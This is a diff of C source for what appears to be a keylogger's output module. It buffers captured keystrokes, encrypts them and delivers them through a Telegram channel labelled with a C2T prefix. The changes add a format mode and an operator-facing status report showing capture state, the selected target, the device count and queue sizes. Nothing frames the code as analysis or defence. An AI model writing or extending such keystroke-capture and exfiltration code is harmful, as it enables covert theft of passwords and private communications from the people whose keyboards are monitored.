@@ -15,6 +15,7 @@
  * along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 
+#include "keyboard.h"
 #include "keyboard_output.h"
 #include "../config/config.h"
 #include "../crypto/crypto.h"
@@ -38,7 +39,7 @@
 
 #define KEYBOARD_BUFFER_CAPACITY 1024U
 #define KEYBOARD_DEFAULT_FLUSH_MS 3000U
-#define KEYBOARD_MIME_TYPE "text/plain; charset=utf-8"
+
 
 typedef struct keyboard_event {
     struct keyboard_event *next;
@@ -219,11 +220,13 @@ void keyboard_output_append(const char *text, size_t length)
     queue_unlock();
 }
 
+static volatile int keyboard_format_mode = KEYBOARD_MODE_CODE;
+
 static void deliver_event(const keyboard_event_t *event)
 {
     for (size_t attempt = 1; attempt <= delivery_attempts; ++attempt) {
         if (telegram_send_encrypted_data(event->encrypted_data, event->length,
-                                         event->nonce, KEYBOARD_MIME_TYPE, nullptr)) {
+                                         event->nonce, C2T_KEYBOARD_MIME_TYPE, nullptr)) {
             return;
         }
         if (attempt < delivery_attempts) {
@@ -323,6 +326,52 @@ int keyboard_toggle_paused(void)
     keyboard_paused = !keyboard_paused;
     return keyboard_paused;
 }
+
+void keyboard_set_format_mode(int mode)
+{
+    keyboard_format_mode = mode;
+}
+
+int keyboard_get_format_mode(void)
+{
+    return keyboard_format_mode;
+}
+
+void keyboard_get_status_info(char *buffer, size_t max_len)
+{
+    if (!buffer || max_len == 0) return;
+
+    char target[128] = "all";
+    keyboard_get_selected_target(target, sizeof(target));
+    int dev_count = keyboard_get_device_count();
+    int paused = keyboard_is_paused();
+    int mode = keyboard_get_format_mode();
+
+    queue_lock();
+    size_t cur_items = queue_items;
+    size_t cur_bytes = queue_bytes;
+    size_t cur_buf = text_buffer_len;
+    queue_unlock();
+
+    snprintf(buffer, max_len,
+             "⌨️ <b>Keyboard Listener Status</b>\n\n"
+             "• <b>Status:</b> %s\n"
+             "• <b>Format Mode:</b> %s\n"
+             "• <b>Selected Target:</b> <code>%s</code>\n"
+             "• <b>Detected Devices:</b> %d\n"
+             "• <b>Pending Buffer:</b> %llu bytes\n"
+             "• <b>Delivery Queue:</b> %llu items / %llu bytes\n"
+             "• <b>Inactivity Flush:</b> %llu ms",
+             paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)",
+             mode == KEYBOARD_MODE_CODE ? "<code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>" : "<code>Raw Plain Text</code>",
+             target,
+             dev_count,
+             (unsigned long long)cur_buf,
+             (unsigned long long)cur_items,
+             (unsigned long long)cur_bytes,
+             (unsigned long long)inactivity_flush_ms);
+}
+
 
 int keyboard_output_init(void)
 {
